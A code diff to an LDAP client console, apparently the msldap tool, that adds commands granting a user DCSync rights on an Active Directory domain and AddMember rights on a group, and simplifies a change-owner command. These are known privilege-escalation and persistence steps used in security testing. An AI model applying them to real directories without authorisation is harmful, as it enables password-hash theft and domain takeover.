@@ -23,7 +23,9 @@ from msldap.commons.url import MSLDAPURLDecoder
 from msldap.ldap_objects import MSADUser, MSADMachine, MSADUser_TSV_ATTRS
 
 from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
+from winacl.dtyp.ace import ACCESS_ALLOWED_OBJECT_ACE, ADS_ACCESS_MASK
 from winacl.dtyp.sid import SID
+from winacl.dtyp.guid import GUID
 
 
 class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
@@ -334,40 +336,36 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 			await self.do_ldapinfo(False)
 			await self.do_adinfo(False)
 
-			try:
-				new_owner_sid = SID.from_string(new_owner_sid)
-			except:
-				print('Incorrect SID!')
-				return False, Exception('Incorrect SID')
+			_, err = await self.connection.change_priv_owner(new_owner_sid, target_dn, target_attribute = target_attribute)
+			if err is not None:
+				raise err
+		except:
+			traceback.print_exc()
+			return False
 
+	async def do_addprivdcsync(self, user_dn, forest = None):
+		"""Adds DCSync rights to the given user by modifying the forest's Security Descriptor to add GetChanges and GetChangesAll ACE"""
+		try:
+			await self.do_ldapinfo(False)
+			await self.do_adinfo(False)
 
-			target_sd = None
-			if target_attribute is None or target_attribute == '':
-				target_attribute = 'nTSecurityDescriptor'
-				res, err = await self.connection.get_objectacl_by_dn(target_dn)
-				if err is not None:
-					raise err
-				target_sd = SECURITY_DESCRIPTOR.from_bytes(res)
-			else:
-				
-				query = '(distinguishedName=%s)' % target_dn
-				async for entry, err in self.connection.pagedsearch(query, [target_attribute]):
-					if err is not None:
-						raise err
-					print(entry['attributes'][target_attribute])
-					target_sd = SECURITY_DESCRIPTOR.from_bytes(entry['attributes'][target_attribute])
-					break
-				else:
-					print('Target DN not found!')
-					return False, Exception('Target DN not found!')
+			_, err = await self.connection.add_priv_dcsync(user_dn, self.adinfo.distinguishedName)
+			if err is not None:
+				raise err
 
-			new_sd = copy.deepcopy(target_sd)
-			new_sd.Owner = new_owner_sid
+			print('Change OK!')
+			return True
+		except:
+			traceback.print_exc()
+			return False
 
-			changes = {
-				target_attribute : [('replace', [new_sd.to_bytes()])]
-			}
-			_, err = await self.connection.modify(target_dn, changes)
+	async def do_addprivaddmember(self, user_dn, group_dn):
+		"""Adds AddMember rights to the user on the group specified by group_dn"""
+		try:
+			await self.do_ldapinfo(False)
+			await self.do_adinfo(False)
+
+			_, err = await self.connection.add_priv_addmember(user_dn, group_dn)
 			if err is not None:
 				raise err
 
